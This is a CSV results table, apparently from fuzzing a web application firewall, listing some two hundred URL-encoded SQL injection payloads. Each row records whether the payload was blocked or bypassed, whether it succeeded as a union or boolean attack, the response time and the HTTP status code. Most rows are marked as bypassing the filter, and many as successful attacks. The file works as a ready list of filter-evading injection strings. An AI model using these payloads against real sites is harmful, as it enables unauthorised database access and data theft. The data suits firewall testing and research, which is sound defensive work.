Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@=1+or%0b!+{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.0101,70.51,No,403
0%27<@=1.+or+not+{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.0068,70.51,No,403
0'<@=.1+||%0bnot+{a%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0154,70.51,No,500
0%27<@!=.1%0b||%0bnot+{x+(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0108,70.51,No,200
0'<@=1+||+!%0b{x+(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0108,70.51,No,500
0'<@=1+or+false=%0b(not%0b{x,Bypassed,No,None,booleanAtk,0.0218,70.51,No,500
0'<@!=1.%0b||%0bnot~false=%0b(not%7e,Bypassed,No,None,Unknown,0.0175,70.51,No,500
0%27<@!=1.+||%0b!%0b{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0181,70.51,No,200
0%27<@!=.1%0bor%0bnot+{x+(select+1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0086,70.51,No,200
0%27<@!=.1+||%0bnot%7e0=+(not+,Bypassed,Yes,unionAtk,Unknown,0.0186,70.51,No,200
0%27<@=.1%0b||%0bnot+{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0162,70.51,No,200
0'<@=.1+or%0bnot+{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0042,70.51,No,403
0'<@=.1+or+!+{x+(select+1)}=1=%0b,Blocked,No,None,Unknown,0.0086,70.51,No,403
0%27<@=1.+or%0bnot~false=%0b(!,Bypassed,Yes,unionAtk,booleanAtk,0.0116,70.51,No,200
0%27<@!=1+||+!%0b{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0178,70.51,No,200
0'<@=1%0b||+!%0b{x%0b(select+1)}=1=+,Bypassed,No,None,Unknown,0.0161,70.51,No,500
0%27<@!=1%0b||+!+{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.012,70.51,No,200
0%27<@!=.1%0b||+{`if`+1}=1%0blike+{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0157,70.63,No,200
0'<@!=.1+||+!+{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0222,70.75,No,500
0'<@!=1.+||+false=%0b(not+{x,Bypassed,No,None,Unknown,0.0133,69.63,No,500
0%27<@=1%0bor+not%0b{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0128,70.28,No,200
0%27<@=1.+or+not%0b{x%0b(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0135,70.28,No,200
0'<@=1.%0b||%0bnot~0=%0b(!,Bypassed,No,None,Unknown,0.0178,70.28,No,500
0'<@=.1+||%0bfalse=%0b(not+{a,Bypassed,No,None,Unknown,0.0132,70.28,No,500
0'<@=.1%0bor+not%0b{x+(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0129,70.28,No,500
0%27<@!=1+or%0b!+{x+(select+1)}=1=,Blocked,No,None,Unknown,0.0131,70.28,No,403
0'<@!=1.%0bor+not+1=+(not+,Bypassed,No,None,Unknown,0.0095,70.28,No,500
0'<@=1.+or%0b!%7e0=%0b(!+,Bypassed,No,None,Unknown,0.0123,70.28,No,500
0'<@=1.%0b||%0b!%0b{x%0b(select%0b1)}=1=,Bypassed,No,None,Unknown,0.0168,70.28,No,500
0'<@!=.1%0bor%0bnot%7efalse=%0b(!,Bypassed,No,None,booleanAtk,0.0157,70.28,No,500
0'<@!=1+or+!+{x+(select%0b1)}=1=,Blocked,No,None,Unknown,0.0176,70.28,No,403
0'<@!=1.%0bor%0b!+{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.02,70.28,No,500
0'<@!=1+||+!+{x%0b(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0081,70.28,No,500
0%27<@!=1+or%0b!+{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0081,70.28,No,200
0%27<@!=1%0b||%0bnot+{x%0b(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0145,70.28,No,200
0%27<@!=1.+or%0bnot%0b{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0104,70.28,No,200
0%27<@!=.1%0bor+not%0b{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.012,70.28,No,200
0%27<@=1+or%0bnot%0b{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.01,70.28,No,403
0%27<@=1+||+!%0b{x%0b(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0169,70.28,No,200
0'<@=1%0bor%0bnot+{x%0b(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.008,70.28,No,500
0%27<@!=.1%0bor%0bnot+{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0078,70.28,No,200
0%27<@=1+or%0b!+{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0077,70.28,No,200
0%27<@=.1+||%0bnot%0b{x+(select%0b1)}=1=,Blocked,No,None,Unknown,0.0143,70.28,No,403
0'<@=1.+or+{`if`+1}=1+like+{`if`%0b1}=1,Bypassed,No,None,Unknown,0.0151,70.28,No,500
0%27<@=1.%0bor+not+1=+(not,Bypassed,Yes,unionAtk,Unknown,0.0146,70.5,No,200
0'<@!=1.%0bor%0b!+{a%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.013,70.5,No,500
0%27<@!=1.%0b||%0b!+{a%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.014,70.5,No,200
0'<@!=1+or%0b!%0btrue=%0b(!~,Blocked,No,None,booleanAtk,0.0088,70.5,No,403
0'<@!=1+or+!+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.01,70.5,No,403
0'<@!=.1%0b||+0=+(not+{a,Bypassed,No,None,Unknown,0.0098,70.5,No,500
0'<@=.1+||+not%0b{x%0b(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0141,70.5,No,500
0%27<@=1+||+not%7e0=+(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0083,70.51,No,200
0%27<@=.1%0bor%0b!%0b{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0143,70.51,No,200
0%27<@!=.1%0b||%0b!%0b{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.014,70.51,No,200
0%27<@!=1+or+not~0=%0b(not+,Bypassed,Yes,unionAtk,Unknown,0.0077,70.51,No,200
0'<@!=.1%0bor%0bnot+{x+(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0127,70.51,No,500
0'<@=.1%0b||%0b!+{x+(select+1)}=1=,Bypassed,No,None,Unknown,0.0196,70.51,No,500
0'<@=.1+or+not%0b1=+(!%7e,Bypassed,No,None,Unknown,0.0135,70.51,No,500
0'<@=1.+||%0bnot%0b1=+(!+,Bypassed,No,None,Unknown,0.0202,70.51,No,500
0%27<@=1.+||+!~false=%0b(!%0b,Bypassed,Yes,unionAtk,Unknown,0.0181,70.51,No,200
0'<@=1.%0bor+{x+(select+1)}=1%0blike%0b{x,Bypassed,No,None,Unknown,0.0202,70.51,No,500
0'<@=.1+or+!+1=+(not+,Bypassed,No,None,Unknown,0.0114,70.51,No,500
0'<@=1.+||+not%0b{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0144,70.51,No,500
0'<@=.1%0b||+!+{a%0b1}=1=+(,Bypassed,No,None,Unknown,0.0153,70.51,No,500
0'<@!=.1%0bor+not%0b1=%0b(not%0b,Bypassed,No,None,Unknown,0.0157,70.51,No,500
0%27<@=1.%0b||+!+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0108,70.51,No,200
0'<@!=.1%0bor+!+{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0115,70.51,No,500
0%27<@!=1+||+!+{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.016,70.51,No,200
0'<@!=.1%0bor+not%0b{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0146,70.63,No,500
0'<@=1%0bor%0bnot%0b1=%0b(!+,Bypassed,No,None,Unknown,0.0103,70.02,No,500
0'<@!=1%0b||+not+{x+(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0214,70.28,No,500
0%27<@=.1+or%0b!%0b{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0184,70.28,No,200
0%27<@=.1%0bor+{x%0b(select%0b1)}=1%0blike+{x,Bypassed,Yes,unionAtk,Unknown,0.0103,70.28,No,200
0%27<@=1.+or+!%0b1=%0b(not,Bypassed,Yes,unionAtk,Unknown,0.0119,70.28,No,200
0'<@!=1.%0b||+!%0b{x%0b(select%0b1)}=1=,Bypassed,No,None,Unknown,0.008,70.28,No,500
0'<@=1.+or+not%0b{x+(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0091,70.28,No,500
0%27<@=1.+||+!+true=%0b(!,Bypassed,Yes,unionAtk,Unknown,0.0074,70.28,No,200
0'||%0b1<@%0b||%0b{`if`%0b1}=1+like+{`if`,Bypassed,No,None,Unknown,0.0101,70.28,No,500
0'<@!=1%0b||+!%0b{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0087,70.28,No,500
0%27<@=.1+or%0bnot+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0178,70.28,No,200
0'<@=.1+or+not+{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.0175,70.28,No,403
0'<@!=1+or+{x%0b(select%0b1)}=1%0blike%0b{`if`,Blocked,No,None,Unknown,0.0168,70.28,No,403
0'<@=1+or+not%0b{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0151,70.28,No,500
0'<@=.1+||%0bnot+{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0093,70.28,No,500
0%27<@!=1.+||%0bnot+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0227,70.28,No,200
0%27<@!=.1+||+not%0b1=+(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0105,70.28,No,200
0%27<@=1%0b||+!%0b{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0156,70.28,No,200
0%27<@!=1.%0b||%0bnot+{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0105,70.28,No,200
0%27<@=1.%0bor+not%0b{x+(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0123,70.28,No,200
0%27<@!=1.%0b||%0b!+{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.01,70.28,No,200
0%27<@=1.+||+!+{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.008,70.28,No,403
0'<@!=1%0b||+!%7efalse=+(!%7e,Bypassed,No,None,Unknown,0.0169,70.39,No,500
0'<@!=.1+||+{a+1}=1%0blike%0b{x%0b(select,Bypassed,No,None,Unknown,0.0096,70.5,No,500
0'<@=.1%0b||%0bnot~0=+(!+,Bypassed,No,None,Unknown,0.0109,70.5,No,500
0'||+1<@+or%0b{`if`%0b1}=1%0blike+{x,Bypassed,No,None,Unknown,0.0136,70.5,No,500
0%27<@=1%0bor%0bnot~false=%0b(not+,Bypassed,Yes,unionAtk,booleanAtk,0.0154,70.5,No,200
0%27<@!=1+||%0bnot+true=+(!+,Bypassed,Yes,unionAtk,Unknown,0.0127,70.5,No,200
0'<@=.1+||%0bnot+true=+(not+,Bypassed,No,None,Unknown,0.0132,70.51,No,500
0%27<@=.1%0bor%0bnot%0b{x+(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0092,70.51,No,200
0%27<@=.1+||%0b!%0b{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0141,70.51,No,200
0'<@!=1%0b||+not+true=%0b(not+,Bypassed,No,None,Unknown,0.009,70.51,No,500
0'<@=.1+||%0b!%0b{x%0b(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0097,70.51,No,403
0%27<@=.1%0bor+not+true=%0b(!+,Bypassed,Yes,unionAtk,booleanAtk,0.0076,70.51,No,200
0%27<@=1.%0bor%0b0=+(!+{x,Bypassed,Yes,unionAtk,Unknown,0.0176,70.51,No,200
0%27<@=1.+or%0bnot%0b{x+(select+1)}=1=,Blocked,No,None,Unknown,0.0133,70.51,No,403
0%27<@=1.+||+not%0b1=%0b(not+,Bypassed,Yes,unionAtk,Unknown,0.023,70.51,No,200
0'<@!=1.%0b||%0b!+{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0078,70.51,No,500
0%27<@!=1+||%0bnot%0b{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0125,70.51,No,200
0'<@=.1%0bor%0b0=+(!+{`if`,Bypassed,No,None,Unknown,0.0111,70.51,No,500
0'<@!=1.%0bor+!+{x+(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0207,70.51,No,500
0%27||+1<@.+||+{x%0b(select%0b1)}=1+like,Bypassed,Yes,unionAtk,Unknown,0.0096,70.51,No,200
0'<@!=1.%0b||%0bfalse=+(!%0b{`if`,Bypassed,No,None,Unknown,0.0161,70.51,No,500
0'<@=1.%0bor+!+true=%0b(!%0b,Bypassed,No,None,booleanAtk,0.015,70.51,No,500
0'<@=.1%0b||+not%0b{x%0b(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0124,70.51,No,500
0%27<@=1.%0b||%0bnot+true=%0b(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0182,70.51,No,200
0'<@=.1+||+not+{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0141,70.75,No,500
0%27<@=.1+or%0b!%0b{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0075,70.75,No,200
0'<@!=.1+||+!%0b1=+(not,Bypassed,No,None,Unknown,0.0125,70.75,No,500
0'<@!=1%0bor%0b!+{x+(select+1)}=1=,Bypassed,No,None,Unknown,0.0129,70.75,No,500
0%27<@!=1.+||+!+{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0087,70.02,No,200
0%27<@!=.1+||%0b!%0b{a%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0132,70.28,No,200
0%27<@!=1+or+not%0b{x+(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0133,70.28,No,200
0'<@=1.%0bor+not+{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0147,70.28,No,500
0%27<@=.1+||+!%7efalse=+(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0182,70.28,No,200
0'<@!=1+or+!+true=+(!%0b,Bypassed,No,None,booleanAtk,0.0267,70.28,No,500
0%27<@!=.1+||%0b!%0b{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0146,70.28,No,200
0%27<@=1.%0b||%0b!%7efalse=%0b(not+,Bypassed,Yes,unionAtk,Unknown,0.0081,70.28,No,200
0%27<@=1.+or%0b!%0b{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0172,70.28,No,200
0'<@=1%0b||%0bnot+{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0161,70.28,No,500
0'<@=1.+||%0b!%0b{x%0b(select+1)}=1=+,Blocked,No,None,Unknown,0.006,70.28,No,403
0'<@=1+||+!+{a+1}=1=+(,Bypassed,No,None,Unknown,0.017,70.28,No,500
0%27<@=.1+||%0btrue+like+{x%0b(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0198,70.28,No,200
0'<@=1.+or%0b!%0b{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0064,70.28,No,403
0%27<@!=1.%0b||+!+{x+(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0226,70.28,No,200
0%27<@=1.%0b||%0b!+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0173,70.28,No,200
0%27<@!=1.+or%0b!~false=%0b(not%0b,Bypassed,Yes,unionAtk,booleanAtk,0.0084,70.28,No,200
0'<@!=1%0b||%0b!%0b{a%0b1}=1=+(,Bypassed,No,None,Unknown,0.0169,70.28,No,500
0%27<@!=1.%0bor%0b!+{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0225,70.28,No,200
0%27<@=1.%0b||+!%0b{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0124,70.28,No,200
0'<@!=1%0bor%0b!+{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.019,70.28,No,500
0%27<@=1+||+!+{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0132,70.5,No,200
0'<@=1.+||+!+{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0144,70.5,No,500
0%27<@!=1.%0bor+not+{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0166,70.5,No,200
0'<@=.1%0b||+!%7efalse=%0b(not+,Bypassed,No,None,Unknown,0.0145,70.5,No,500
0'<@!=1.+or+!+{a+1}=1=+(,Bypassed,No,None,Unknown,0.0071,70.5,No,500
0%27<@=1.%0bor+!+{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0129,70.5,No,200
0'or+!@<@+or%0b{a%0b1}=1%0blike%0b{`if`,Bypassed,No,None,Unknown,0.0077,70.51,No,500
0%27<@!=1.+or%0bnot+{x+(select+1)}=1=,Blocked,No,None,Unknown,0.0121,70.51,No,403
0%27<@!=1%0b||+!%0b{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0072,70.51,No,200
0%27<@=1+||+not%0b1=+(not,Bypassed,Yes,unionAtk,Unknown,0.015,70.51,No,200
0'<@=1%0bor+!%0b{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.005,70.51,No,500
0'<@=1%0bor+not+{x+(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0129,70.51,No,500
0%27<@!=.1%0b||%0b!%0b{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0158,70.51,No,200
0%27<@!=1.+||+false=+(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0105,70.51,No,200
0'<@!=.1+||%0bnot+{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0112,70.51,No,500
0'<@=.1+||%0b{`if`%0b1}=1%0blike+{x%0b(select,Bypassed,No,None,Unknown,0.0153,70.51,No,500
0'<@=.1+or+not+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.006,70.51,No,403
0'<@=1%0b||%0bnot%0btrue=+(!,Bypassed,No,None,Unknown,0.0159,70.51,No,500
0%27<@!=.1+or+~%0b{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0229,70.51,No,200
0%27<@!=1.%0bor+not%0b{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0176,70.51,No,200
0'<@!=1%0bor+not%0b{x%0b(select+1)}=1=+,Bypassed,No,None,Unknown,0.0167,70.51,No,500
0%27or%0b@<@.+or%0bnot%0b1=+(,Bypassed,Yes,unionAtk,Unknown,0.01,70.51,No,200
0'<@!=1.%0b||%0bnot+{a+1}=1=+(,Bypassed,No,None,Unknown,0.0087,70.51,No,500
0%27||+@<@.%0bor+not+{x%0b(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0189,70.51,No,200
0'<@=.1+||+!%0b{x%0b(select+1)}=1=,Bypassed,No,None,Unknown,0.0287,70.51,No,500
0%27<@!=.1%0bor%0b!+{x+(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.012,70.63,No,200
0'<@!=1.+or%0b!%0b1=+(not+,Bypassed,No,None,Unknown,0.0139,70.75,No,500
0'<@=1%0b||+!+1=+(not+,Bypassed,No,None,Unknown,0.0108,70.75,No,500
0%27<@=1+or%0bnot+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0241,70.75,No,200
0'<@=1%0b||+!%7e0=+(not,Bypassed,No,None,Unknown,0.0233,70.28,No,500
0%27<@=1+||+!%0b{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0177,70.28,No,200
0'<@=1.%0bor+!~false=%0b(not+,Bypassed,No,None,booleanAtk,0.0118,70.28,No,500
0%27<@!=.1+or%0bnot~false=+(not+,Bypassed,Yes,unionAtk,booleanAtk,0.0138,70.28,No,200
0'<@=1.%0b||+!%0b{x+(select+1)}=1=,Bypassed,No,None,Unknown,0.0061,70.28,No,500
0%27<@=.1+or+!+{x+(select%0b1)}=1=,Blocked,No,None,Unknown,0.0068,70.28,No,403
0%27<@=1.%0bor+not+{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.017,70.28,No,200
0'<@!=1.%0bor+not%0b{x+(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0131,70.28,No,500
0%27<@!=1%0bor%0b!+{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0193,70.28,No,200
0%27<@!=1.+||+{`if`+1}=1%0blike+{`if`+1}=1,Bypassed,Yes,unionAtk,Unknown,0.008,70.28,No,200
0%27<@!=1+||+!%0b{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0113,70.28,No,200
0'<@!=1+or%0b!+true=+(not+,Bypassed,No,None,booleanAtk,0.0167,70.28,No,500
0'||%0b@<@.+or%0b!%0b{x+(select%0b1)}=1,Bypassed,No,None,Unknown,0.0123,70.28,No,500
0%27<@!=.1%0bor%0bnot+{x+(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0157,70.28,No,200
0'<@=1+||%0b!%0b{x%0b(select+1)}=1=+,Blocked,No,None,Unknown,0.007,70.28,No,403
0'<@=1%0bor+not+{x%0b(select+1)}=1=+,Bypassed,No,None,Unknown,0.0083,70.28,No,500
0%27<@=1+or%0b!+{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0183,70.28,No,200
0%27<@=.1+||+!+{`if`%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0158,70.28,No,200
0%27<@=1+or+!%0b{x+(select+1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0147,70.28,No,200
0%27<@!=.1%0bor+not%7efalse=+(not+,Bypassed,Yes,unionAtk,booleanAtk,0.0108,70.28,No,200
0%27<@=1+||+not+{x+(select%0b1)}=1=,Blocked,No,None,Unknown,0.0206,70.39,No,403
0%27<@!=1.+||+not%7efalse=%0b(!+,Bypassed,Yes,unionAtk,Unknown,0.0078,70.5,No,200
0%27<@!=.1+or+not+{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0178,70.5,No,200
0'<@=.1+or%0bnot+{x+(select+1)}=1=%0b,Blocked,No,None,Unknown,0.0215,70.5,No,403
0'<@=1+||+!%7efalse=+(!%0b,Bypassed,No,None,Unknown,0.0157,70.5,No,500
0'<@!=.1+or+not%0b{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0142,70.51,No,500
0'<@=1+||%0bnot%0b{a+1}=1=+(,Bypassed,No,None,Unknown,0.0186,70.51,No,500
0%27<@!=.1%0b||%0bnot+{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.011,70.51,No,200
0'or+!@<@.%0bor+!%7e0=%0b(,Bypassed,No,None,Unknown,0.0166,70.51,No,500
0'<@!=.1+||+not+1=+(!%0b,Bypassed,No,None,Unknown,0.0113,70.51,No,500
0'<@=1%0bor+not%7efalse=+(false),Bypassed,No,None,booleanAtk,0.0074,70.51,No,500
0%27<@=1%0b||%0bnot%0b{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0105,70.51,No,200
0'<@=1.%0bor%0bnot%0b{x%0b(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0151,70.51,No,500
0%27<@=1.+or%0bnot+{x+(select+1)}=1=,Blocked,No,None,Unknown,0.0217,70.51,No,403
0'<@!=1+or%0bnot+true=%0b(not%0b,Bypassed,No,None,booleanAtk,0.0156,70.51,No,500
0%27<@!=.1%0b||+not%0b{`if`%0b1}=1%0bis+,Bypassed,Yes,unionAtk,Unknown,0.0249,70.51,No,200
0%27<@=1%0bor+not%0b{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0156,70.51,No,200
0'<@!=1+||%0b{x%0b(select%0b1)}=1%0blike+{x,Bypassed,No,None,Unknown,0.0128,70.51,No,500
0%27<@!=1+or%0b!+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0155,70.51,No,200
0'||+1<@.+or+{x+(select%0b1)}=1+like,Blocked,No,None,Unknown,0.0071,70.51,No,403
0%27<@=.1%0bor+not+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.014,70.51,No,200
0%27<@!=.1%0b||+!+true=%0b(!+,Bypassed,Yes,unionAtk,Unknown,0.0136,70.51,No,200
0'<@=1.+or+!+{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0136,70.51,No,500
0%27<@!=.1+||%0bnot%0btrue=%0b(!+,Bypassed,Yes,unionAtk,Unknown,0.0189,70.63,No,200
0'<@!=1.%0bor%0b!+{x%0b(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0128,70.75,No,500
0'<@=1%0b||+not+{a%0b1}=1=+(,Bypassed,No,None,Unknown,0.0231,70.75,No,500
0%27<@!=1.+or%0bnot+{`if`%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0215,70.75,No,200
0'<@!=1%0b||+!+{a+1}=1=+(,Bypassed,No,None,Unknown,0.0133,70.75,No,500
0'<@!=.1%0b||%0bnot%0b{a%0b1}=1=+(,Bypassed,No,None,Unknown,0.0133,70.75,No,500
0%27<@=.1%0b||+{x+(select+1)}=1%0blike%0b{x,Bypassed,Yes,unionAtk,Unknown,0.013,70.75,No,200
0'<@=1+||+not+true=%0b(!+,Bypassed,No,None,Unknown,0.0125,70.28,No,500
0'<@=.1%0bor%0bfalse=%0b(not%7e0,Bypassed,No,None,booleanAtk,0.0177,70.28,No,500
0%27<@!=.1%0b||+!%0b1=+(!+,Bypassed,Yes,unionAtk,Unknown,0.0101,70.28,No,200
0'<@=.1+||%0bnot%0b{a%0b1}=1=+(,Bypassed,No,None,Unknown,0.0133,70.28,No,500
0'<@!=1.+or%0bnot%0btrue=%0b(!,Blocked,No,None,booleanAtk,0.0054,70.28,No,403
0'<@=1.+||%0bnot+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0071,70.28,No,403
0%27<@=.1+or+not+1=+(!+,Bypassed,Yes,unionAtk,Unknown,0.0284,70.28,No,200
0%27<@!=.1+||+not+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0157,70.28,No,403
0%27<@!=1.+or%0bnot+1=+(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0148,70.28,No,200
0%27<@!=1.+or+!+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0174,70.28,No,200
0'<@=.1+||%0b{a+1}=1+like%0b{x+(select,Bypassed,No,None,Unknown,0.0165,70.28,No,500
0'<@=1.%0b||%0bnot%0b{x+(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0134,70.28,No,500
0'<@!=1.+||+!%0b1=+(not~,Bypassed,No,None,Unknown,0.0158,70.28,No,500
0%27<@!=1+or+!+{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0192,70.28,No,200
0'<@=1%0bor+!~false=+(not+,Bypassed,No,None,booleanAtk,0.019,70.28,No,500
